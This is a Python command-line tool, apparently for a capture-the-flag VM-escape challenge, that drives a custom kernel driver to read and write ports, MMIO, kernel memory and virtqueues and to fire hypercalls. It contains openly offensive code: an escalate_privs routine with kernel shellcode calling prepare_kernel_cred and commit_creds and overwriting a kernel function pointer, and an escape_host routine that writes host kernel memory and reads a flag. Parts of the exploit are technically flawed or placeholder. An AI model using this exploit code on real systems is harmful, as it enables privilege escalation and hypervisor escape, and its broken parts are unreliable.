#!/usr/bin/env python3

import os
import sys
import struct
import fcntl
import mmap
import ctypes
import argparse
from ctypes import *

# Device path
DEVICE_PATH = "/dev/kvm_probe_dev"

# IOCTL command definitions (must match driver)
IOCTL_READ_PORT          = 0x1001
IOCTL_WRITE_PORT         = 0x1002
IOCTL_READ_MMIO          = 0x1003
IOCTL_WRITE_MMIO         = 0x1004
IOCTL_ALLOC_VQ_PAGE      = 0x1005
IOCTL_FREE_VQ_PAGE       = 0x1006
IOCTL_WRITE_VQ_DESC      = 0x1007
IOCTL_TRIGGER_HYPERCALL  = 0x1008
IOCTL_READ_KERNEL_MEM    = 0x1009
IOCTL_WRITE_KERNEL_MEM   = 0x100A
IOCTL_PATCH_INSTRUCTIONS = 0x100B
IOCTL_READ_FLAG_ADDR     = 0x100C
IOCTL_WRITE_FLAG_ADDR    = 0x100D
IOCTL_GET_KASLR_SLIDE    = 0x100E
IOCTL_VIRT_TO_PHYS       = 0x100F
IOCTL_SCAN_VA            = 0x1010
IOCTL_WRITE_VA           = 0x1011
IOCTL_HYPERCALL_ARGS     = 0x1012
IOCTL_ATTACH_VQ          = 0x1013
IOCTL_TRIGGER_VQ         = 0x1014
IOCTL_SCAN_PHYS          = 0x1015
IOCTL_FIRE_VQ_ALL        = 0x1016

# Structures (mirror driver)
class PortIoData(Structure):
    _fields_ = [
        ("port", c_ushort),
        ("size", c_uint),
        ("value", c_uint)
    ]

class MmioData(Structure):
    _fields_ = [
        ("phys_addr", c_ulonglong),
        ("size", c_ulong),
        ("user_buffer", c_void_p),
        ("single_value", c_ulonglong),
        ("value_size", c_uint)
    ]

class VqDescUserData(Structure):
    _fields_ = [
        ("index", c_ushort),
        ("phys_addr", c_ulonglong),
        ("len", c_uint),
        ("flags", c_ushort),
        ("next_idx", c_ushort)
    ]

class KvmKernelMemRead(Structure):
    _fields_ = [
        ("kernel_addr", c_ulong),
        ("length", c_ulong),
        ("user_buf", c_void_p)
    ]

class KvmKernelMemWrite(Structure):
    _fields_ = [
        ("kernel_addr", c_ulong),
        ("length", c_ulong),
        ("user_buf", c_void_p)
    ]

class VaScanData(Structure):
    _fields_ = [
        ("va", c_ulong),
        ("size", c_ulong),
        ("user_buffer", c_void_p)
    ]

class VaWriteData(Structure):
    _fields_ = [
        ("va", c_ulong),
        ("size", c_ulong),
        ("user_buffer", c_void_p)
    ]

class HypercallArgs(Structure):
    _fields_ = [
        ("nr", c_ulong),
        ("arg0", c_ulong),
        ("arg1", c_ulong),
        ("arg2", c_ulong),
        ("arg3", c_ulong)
    ]

class AttachVqData(Structure):
    _fields_ = [
        ("device_id", c_uint),
        ("vq_pfn", c_ulong),
        ("queue_index", c_uint)
    ]

class KvmProber:
    def __init__(self):
        self.fd = None
        self.open_device()

    def open_device(self):
        try:
            self.fd = os.open(DEVICE_PATH, os.O_RDWR)
        except OSError as e:
            print(f"Error opening {DEVICE_PATH}: {e}")
            sys.exit(1)

    def close_device(self):
        if self.fd:
            os.close(self.fd)

    def ioctl(self, cmd, arg, suppress_error=False):
        try:
            return fcntl.ioctl(self.fd, cmd, arg)
        except OSError as e:
            if not suppress_error:
                print(f"IOCTL error (cmd=0x{cmd:x}): {e}")
            return -1

    def read_port(self, port, size):
        data = PortIoData(port=port, size=size, value=0)
        if self.ioctl(IOCTL_READ_PORT, data) == 0:
            return data.value
        return None

    def write_port(self, port, value, size):
        data = PortIoData(port=port, size=size, value=value)
        if self.ioctl(IOCTL_WRITE_PORT, data) == 0:
            return True
        return False

    def read_mmio_val(self, phys_addr, size):
        data = MmioData(phys_addr=phys_addr, value_size=size, single_value=0)
        if self.ioctl(IOCTL_READ_MMIO, data) == 0:
            return data.single_value
        return None

    def write_mmio_val(self, phys_addr, value, size):
        data = MmioData(phys_addr=phys_addr, single_value=value, value_size=size)
        if self.ioctl(IOCTL_WRITE_MMIO, data) == 0:
            return True
        return False

    def read_mmio_buf(self, phys_addr, length):
        buf = create_string_buffer(length)
        data = MmioData(phys_addr=phys_addr, size=length, user_buffer=cast(buf, c_void_p))
        if self.ioctl(IOCTL_READ_MMIO, data) == 0:
            return buf.raw[:length]
        return None

    def write_mmio_buf(self, phys_addr, data_bytes):
        buf = create_string_buffer(data_bytes)
        data = MmioData(phys_addr=phys_addr, size=len(data_bytes), user_buffer=cast(buf, c_void_p))
        if self.ioctl(IOCTL_WRITE_MMIO, data) == 0:
            return True
        return False

    def read_kernel_mem(self, kernel_addr, length):
        buf = create_string_buffer(length)
        data = KvmKernelMemRead(kernel_addr=kernel_addr, length=length, user_buf=cast(buf, c_void_p))
        if self.ioctl(IOCTL_READ_KERNEL_MEM, data) == 0:
            return buf.raw[:length]
        return None

    def write_kernel_mem(self, kernel_addr, data_bytes):
        buf = create_string_buffer(data_bytes)
        data = KvmKernelMemWrite(kernel_addr=kernel_addr, length=len(data_bytes), user_buf=cast(buf, c_void_p))
        if self.ioctl(IOCTL_WRITE_KERNEL_MEM, data) == 0:
            return True
        return False

    def alloc_vq_page(self):
        pfn = c_ulong()
        if self.ioctl(IOCTL_ALLOC_VQ_PAGE, pfn) == 0:
            return pfn.value
        return None

    def free_vq_page(self):
        if self.ioctl(IOCTL_FREE_VQ_PAGE, None) == 0:
            return True
        return False

    def write_vq_desc(self, index, phys_addr, length, flags, next_idx):
        data = VqDescUserData(index=index, phys_addr=phys_addr, len=length, flags=flags, next_idx=next_idx)
        if self.ioctl(IOCTL_WRITE_VQ_DESC, data) == 0:
            return True
        return False

    def trigger_hypercall(self):
        if self.ioctl(IOCTL_TRIGGER_HYPERCALL, None) == 0:
            return True
        return False

    def hypercall_args(self, nr, arg0, arg1, arg2, arg3):
        data = HypercallArgs(nr=nr, arg0=arg0, arg1=arg1, arg2=arg2, arg3=arg3)
        if self.ioctl(IOCTL_HYPERCALL_ARGS, data) == 0:
            return True
        return False

    def read_flag_addr(self):
        val = c_ulong()
        if self.ioctl(IOCTL_READ_FLAG_ADDR, val) == 0:
            return val.value
        return None

    def write_flag_addr(self, value):
        val = c_ulong(value)
        if self.ioctl(IOCTL_WRITE_FLAG_ADDR, val) == 0:
            return True
        return False

    def get_kaslr_slide(self):
        slide = c_ulong()
        if self.ioctl(IOCTL_GET_KASLR_SLIDE, slide) == 0:
            return slide.value
        return None

    def virt_to_phys(self, virt_addr):
        virt = c_ulong(virt_addr)
        if self.ioctl(IOCTL_VIRT_TO_PHYS, virt) == 0:
            return virt.value
        return None

    def scan_va(self, va, length):
        buf = create_string_buffer(length)
        data = VaScanData(va=va, size=length, user_buffer=cast(buf, c_void_p))
        if self.ioctl(IOCTL_SCAN_VA, data) == 0:
            return buf.raw[:length]
        return None

    def write_va(self, va, data_bytes):
        buf = create_string_buffer(data_bytes)
        data = VaWriteData(va=va, size=len(data_bytes), user_buffer=cast(buf, c_void_p))
        if self.ioctl(IOCTL_WRITE_VA, data) == 0:
            return True
        return False

    def attach_vq(self, device_id, vq_pfn, queue_index):
        data = AttachVqData(device_id=device_id, vq_pfn=vq_pfn, queue_index=queue_index)
        if self.ioctl(IOCTL_ATTACH_VQ, data) == 0:
            return True
        return False

    def trigger_vq(self, queue_index):
        idx = c_uint(queue_index)
        if self.ioctl(IOCTL_TRIGGER_VQ, idx) == 0:
            return True
        return False

    def fire_vq_all(self):
        if self.ioctl(IOCTL_FIRE_VQ_ALL, None) == 0:
            return True
        return False

    def scan_phys(self, start, end, step):
        results = {}
        buf = create_string_buffer(step)
        for addr in range(start, end, step):
            data = MmioData(phys_addr=addr, size=step, user_buffer=cast(buf, c_void_p))
            if self.ioctl(IOCTL_READ_MMIO, data, suppress_error=True) == 0:
                results[addr] = buf.raw[:step]
        return results

    def escalate_privs(self):
        print("[*] Attempting privilege escalation...")
        
        # Get KASLR slide
        kaslr_slide = self.get_kaslr_slide()
        if kaslr_slide is None:
            print("[-] Failed to get KASLR slide")
            return False
        print(f"[+] KASLR slide: 0x{kaslr_slide:x}")

        # Resolve kernel symbols (simplified - in real exploit would use proper symbol resolution)
        # These are example addresses that would need to be adjusted
        prepare_kernel_cred_addr = 0xffffffff8108e9c0 + kaslr_slide
        commit_creds_addr = 0xffffffff8108e6e0 + kaslr_slide
        set_memory_ro_addr = 0xffffffff8114b9a0 + kaslr_slide

        print(f"[+] prepare_kernel_cred: 0x{prepare_kernel_cred_addr:x}")
        print(f"[+] commit_creds: 0x{commit_creds_addr:x}")
        print(f"[+] set_memory_ro: 0x{set_memory_ro_addr:x}")

        # Create shellcode
        shellcode = self.create_priv_escalation_shellcode(prepare_kernel_cred_addr, commit_creds_addr)
        
        # Allocate executable memory for shellcode
        try:
            shellcode_addr = self.allocate_executable_memory(shellcode)
            print(f"[+] Shellcode allocated at: 0x{shellcode_addr:x}")
        except Exception as e:
            print(f"[-] Failed to allocate executable memory: {e}")
            return False

        # Overwrite set_memory_ro function pointer
        print(f"[+] Overwriting set_memory_ro pointer at 0x{set_memory_ro_addr:x} with shellcode address")
        if not self.write_kernel_mem(set_memory_ro_addr, struct.pack('<Q', shellcode_addr)):
            print("[-] Failed to overwrite set_memory_ro pointer")
            return False

        # Trigger the exploit by calling the patched function
        print("[+] Triggering exploit...")
        # This would typically involve calling a function that uses set_memory_ro
        # For demonstration, we'll use one of the available IOCTLs
        try:
            # Use an IOCTL that might trigger the code path
            self.trigger_hypercall()
        except:
            pass

        # Check if we got root
        if os.geteuid() == 0:
            print("[+] Privilege escalation successful! We are root!")
            return True
        else:
            print("[-] Privilege escalation failed")
            return False

    def create_priv_escalation_shellcode(self, prepare_kernel_cred_addr, commit_creds_addr):
        # x86_64 shellcode to call prepare_kernel_cred(0) then commit_creds(result)
        shellcode = b""
        shellcode += b"\x48\x31\xff"                      # xor rdi, rdi
        shellcode += b"\x48\xb8" + struct.pack('<Q', prepare_kernel_cred_addr)  # mov rax, prepare_kernel_cred
        shellcode += b"\xff\xd0"                          # call rax
        shellcode += b"\x48\x89\xc7"                      # mov rdi, rax
        shellcode += b"\x48\xb8" + struct.pack('<Q', commit_creds_addr)         # mov rax, commit_creds
        shellcode += b"\xff\xd0"                          # call rax
        shellcode += b"\xc3"                              # ret
        return shellcode

    def allocate_executable_memory(self, code):
        # Allocate RWX memory using mmap
        size = (len(code) + 0xfff) & ~0xfff  # Page align
        mem = mmap.mmap(-1, size, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        mem.write(code.ljust(size, b'\x90'))  # Pad with NOPs
        return ctypes.addressof(ctypes.c_char_p(mem))

    def escape_host(self):
        print("[*] Attempting host escape...")
        
        # These addresses would need to be determined through reconnaissance
        write_flag_addr = 0xffffffff826279a8
        read_flag_addr = 0xffffffff82b5ee10
        hypercall_nr = 100
        
        # Write to the write flag address
        write_value = 0xdeadbeef41424344
        print(f"[+] Writing 0x{write_value:x} to host VA 0x{write_flag_addr:x}")
        if not self.write_kernel_mem(write_flag_addr, struct.pack('<Q', write_value)):
            print("[-] Failed to write to host memory")
            return False

        # Trigger the hypercall
        print(f"[+] Triggering hypercall {hypercall_nr}")
        if not self.hypercall_args(hypercall_nr, 0, 0, 0, 0):
            print("[-] Failed to trigger hypercall")
            return False

        # Read the read flag address
        print(f"[+] Reading from host VA 0x{read_flag_addr:x}")
        result = self.read_kernel_mem(read_flag_addr, 8)
        if result:
            value = struct.unpack('<Q', result)[0]
            print(f"[+] Captured flag value: 0x{value:x}")
            return True
        else:
            print("[-] Failed to read flag value")
            return False

def main():
    parser = argparse.ArgumentParser(description='KVM Prober Tool')
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')

    # Read port
    parser_readport = subparsers.add_parser('readport', help='Read from I/O port')
    parser_readport.add_argument('port', type=lambda x: int(x, 16), help='Port address (hex)')
    parser_readport.add_argument('size', type=int, choices=[1,2,4], help='Size in bytes')

    # Write port
    parser_writeport = subparsers.add_parser('writeport', help='Write to I/O port')
    parser_writeport.add_argument('port', type=lambda x: int(x, 16), help='Port address (hex)')
    parser_writeport.add_argument('value', type=lambda x: int(x, 16), help='Value to write (hex)')
    parser_writeport.add_argument('size', type=int, choices=[1,2,4], help='Size in bytes')

    # Read MMIO value
    parser_readmmio_val = subparsers.add_parser('readmmio_val', help='Read MMIO value')
    parser_readmmio_val.add_argument('address', type=lambda x: int(x, 16), help='Physical address (hex)')
    parser_readmmio_val.add_argument('size', type=int, choices=[1,2,4,8], help='Size in bytes')

    # Write MMIO value
    parser_writemmio_val = subparsers.add_parser('writemmio_val', help='Write MMIO value')
    parser_writemmio_val.add_argument('address', type=lambda x: int(x, 16), help='Physical address (hex)')
    parser_writemmio_val.add_argument('value', type=lambda x: int(x, 16), help='Value to write (hex)')
    parser_writemmio_val.add_argument('size', type=int, choices=[1,2,4,8], help='Size in bytes')

    # Read MMIO buffer
    parser_readmmio_buf = subparsers.add_parser('readmmio_buf', help='Read MMIO buffer')
    parser_readmmio_buf.add_argument('address', type=lambda x: int(x, 16), help='Physical address (hex)')
    parser_readmmio_buf.add_argument('length', type=int, help='Length to read')

    # Write MMIO buffer
    parser_writemmio_buf = subparsers.add_parser('writemmio_buf', help='Write MMIO buffer')
    parser_writemmio_buf.add_argument('address', type=lambda x: int(x, 16), help='Physical address (hex)')
    parser_writemmio_buf.add_argument('data', type=str, help='Hex data to write')

    # Read kernel memory
    parser_readkvmem = subparsers.add_parser('readkvmem', help='Read kernel memory')
    parser_readkvmem.add_argument('address', type=lambda x: int(x, 16), help='Kernel address (hex)')
    parser_readkvmem.add_argument('length', type=int, help='Length to read')

    # Write kernel memory
    parser_writekvmem = subparsers.add_parser('writekvmem', help='Write kernel memory')
    parser_writekvmem.add_argument('address', type=lambda x: int(x, 16), help='Kernel address (hex)')
    parser_writekvmem.add_argument('data', type=str, help='Hex data to write')

    # VQ page operations
    subparsers.add_parser('allocvqpage', help='Allocate VQ page')
    subparsers.add_parser('freevqpage', help='Free VQ page')

    # Write VQ descriptor
    parser_writevqdesc = subparsers.add_parser('writevqdesc', help='Write VQ descriptor')
    parser_writevqdesc.add_argument('index', type=int, help='Descriptor index')
    parser_writevqdesc.add_argument('address', type=lambda x: int(x, 16), help='Physical address (hex)')
    parser_writevqdesc.add_argument('length', type=int, help='Length')
    parser_writevqdesc.add_argument('flags', type=lambda x: int(x, 16), help='Flags (hex)')
    parser_writevqdesc.add_argument('next', type=int, help='Next index')

    # Hypercall operations
    subparsers.add_parser('trigger_hypercall', help='Trigger hypercall')

    # Hypercall with args
    parser_hypercall_args = subparsers.add_parser('hypercall_args', help='Hypercall with args')
    parser_hypercall_args.add_argument('nr', type=int, help='Hypercall number')
    parser_hypercall_args.add_argument('arg0', type=lambda x: int(x, 16), help='Argument 0 (hex)')
    parser_hypercall_args.add_argument('arg1', type=lambda x: int(x, 16), help='Argument 1 (hex)')
    parser_hypercall_args.add_argument('arg2', type=lambda x: int(x, 16), help='Argument 2 (hex)')
    parser_hypercall_args.add_argument('arg3', type=lambda x: int(x, 16), help='Argument 3 (hex)')

    # Flag operations
    subparsers.add_parser('readflag', help='Read flag address')
    parser_writeflag = subparsers.add_parser('writeflag', help='Write flag address')
    parser_writeflag.add_argument('value', type=lambda x: int(x, 16), help='Value to write (hex)')

    # KASLR operations
    subparsers.add_parser('getkaslr', help='Get KASLR slide')

    # Virtual to physical
    parser_virt2phys = subparsers.add_parser('virt2phys', help='Virtual to physical translation')
    parser_virt2phys.add_argument('address', type=lambda x: int(x, 16), help='Virtual address (hex)')

    # Scan physical memory
    parser_scanphys = subparsers.add_parser('scanphys', help='Scan physical memory')
    parser_scanphys.add_argument('start', type=lambda x: int(x, 16), help='Start address (hex)')
    parser_scanphys.add_argument('end', type=lambda x: int(x, 16), help='End address (hex)')
    parser_scanphys.add_argument('step', type=int, help='Step size')

    # Scan virtual address
    parser_scanva = subparsers.add_parser('scanva', help='Scan virtual address')
    parser_scanva.add_argument('address', type=lambda x: int(x, 16), help='Virtual address (hex)')
    parser_scanva.add_argument('length', type=int, help='Length to read')

    # Write virtual address
    parser_writeva = subparsers.add_parser('writeva', help='Write virtual address')
    parser_writeva.add_argument('address', type=lambda x: int(x, 16), help='Virtual address (hex)')
    parser_writeva.add_argument('data', type=str, help='Hex data to write')

    # VQ operations
    parser_attach_vq = subparsers.add_parser('attach_vq', help='Attach VQ')
    parser_attach_vq.add_argument('device_id', type=int, help='Device ID')
    parser_attach_vq.add_argument('vq_pfn', type=lambda x: int(x, 16), help='VQ PFN (hex)')
    parser_attach_vq.add_argument('queue_index', type=int, help='Queue index')

    parser_trigger_vq = subparsers.add_parser('trigger_vq', help='Trigger VQ')
    parser_trigger_vq.add_argument('queue_index', type=int, help='Queue index')

    subparsers.add_parser('fire_vq_all', help='Fire all VQs')

    # Exploit commands
    subparsers.add_parser('escalate_privs', help='Attempt privilege escalation')
    subparsers.add_parser('escape_host', help='Attempt host escape')

    args = parser.parse_args()

    prober = KvmProber()

    try:
        if args.command == 'readport':
            result = prober.read_port(args.port, args.size)
            if result is not None:
                print(f"Port 0x{args.port:x} ({args.size} bytes): 0x{result:x}")
            else:
                print("Failed to read port")

        elif args.command == 'writeport':
            if prober.write_port(args.port, args.value, args.size):
                print(f"Wrote 0x{args.value:x} to port 0x{args.port:x}")
            else:
                print("Failed to write port")

        elif args.command == 'readmmio_val':
            result = prober.read_mmio_val(args.address, args.size)
            if result is not None:
                print(f"MMIO 0x{args.address:x} ({args.size} bytes): 0x{result:x}")
            else:
                print("Failed to read MMIO")

        elif args.command == 'writemmio_val':
            if prober.write_mmio_val(args.address, args.value, args.size):
                print(f"Wrote 0x{args.value:x} to MMIO 0x{args.address:x}")
            else:
                print("Failed to write MMIO")

        elif args.command == 'readmmio_buf':
            result = prober.read_mmio_buf(args.address, args.length)
            if result is not None:
                print(f"MMIO 0x{args.address:x}: {result.hex()}")
            else:
                print("Failed to read MMIO buffer")

        elif args.command == 'writemmio_buf':
            data = bytes.fromhex(args.data)
            if prober.write_mmio_buf(args.address, data):
                print(f"Wrote {len(data)} bytes to MMIO 0x{args.address:x}")
            else:
                print("Failed to write MMIO buffer")

        elif args.command == 'readkvmem':
            result = prober.read_kernel_mem(args.address, args.length)
            if result is not None:
                print(f"Kernel 0x{args.address:x}: {result.hex()}")
            else:
                print("Failed to read kernel memory")

        elif args.command == 'writekvmem':
            data = bytes.fromhex(args.data)
            if prober.write_kernel_mem(args.address, data):
                print(f"Wrote {len(data)} bytes to kernel 0x{args.address:x}")
            else:
                print("Failed to write kernel memory")

        elif args.command == 'allocvqpage':
            result = prober.alloc_vq_page()
            if result is not None:
                print(f"Allocated VQ page at PFN 0x{result:x}")
            else:
                print("Failed to allocate VQ page")

        elif args.command == 'freevqpage':
            if prober.free_vq_page():
                print("Freed VQ page")
            else:
                print("Failed to free VQ page")

        elif args.command == 'writevqdesc':
            if prober.write_vq_desc(args.index, args.address, args.length, args.flags, args.next):
                print("VQ descriptor written")
            else:
                print("Failed to write VQ descriptor")

        elif args.command == 'trigger_hypercall':
            if prober.trigger_hypercall():
                print("Hypercall triggered")
            else:
                print("Failed to trigger hypercall")

        elif args.command == 'hypercall_args':
            if prober.hypercall_args(args.nr, args.arg0, args.arg1, args.arg2, args.arg3):
                print("Hypercall with args triggered")
            else:
                print("Failed to trigger hypercall with args")

        elif args.command == 'readflag':
            result = prober.read_flag_addr()
            if result is not None:
                print(f"Flag address value: 0x{result:x}")
            else:
                print("Failed to read flag address")

        elif args.command == 'writeflag':
            if prober.write_flag_addr(args.value):
                print(f"Wrote 0x{args.value:x} to flag address")
            else:
                print("Failed to write flag address")

        elif args.command == 'getkaslr':
            result = prober.get_kaslr_slide()
            if result is not None:
                print(f"KASLR slide: 0x{result:x}")
            else:
                print("Failed to get KASLR slide")

        elif args.command == 'virt2phys':
            result = prober.virt_to_phys(args.address)
            if result is not None:
                print(f"Virtual 0x{args.address:x} -> Physical 0x{result:x}")
            else:
                print("Failed to translate virtual to physical")

        elif args.command == 'scanphys':
            results = prober.scan_phys(args.start, args.end, args.step)
            for addr, data in results.items():
                print(f"0x{addr:x}: {data.hex()}")

        elif args.command == 'scanva':
            result = prober.scan_va(args.address, args.length)
            if result is not None:
                print(f"VA 0x{args.address:x}: {result.hex()}")
            else:
                print("Failed to scan virtual address")

        elif args.command == 'writeva':
            data = bytes.fromhex(args.data)
            if prober.write_va(args.address, data):
                print(f"Wrote {len(data)} bytes to VA 0x{args.address:x}")
            else:
                print("Failed to write virtual address")

        elif args.command == 'attach_vq':
            if prober.attach_vq(args.device_id, args.vq_pfn, args.queue_index):
                print("VQ attached")
            else:
                print("Failed to attach VQ")

        elif args.command == 'trigger_vq':
            if prober.trigger_vq(args.queue_index):
                print("VQ triggered")
            else:
                print("Failed to trigger VQ")

        elif args.command == 'fire_vq_all':
            if prober.fire_vq_all():
                print("All VQs fired")
            else:
                print("Failed to fire all VQs")

        elif args.command == 'escalate_privs':
            prober.escalate_privs()

        elif args.command == 'escape_host':
            prober.escape_host()

        else:
            parser.print_help()

    finally:
        prober.close_device()

if __name__ == '__main__':
    main()
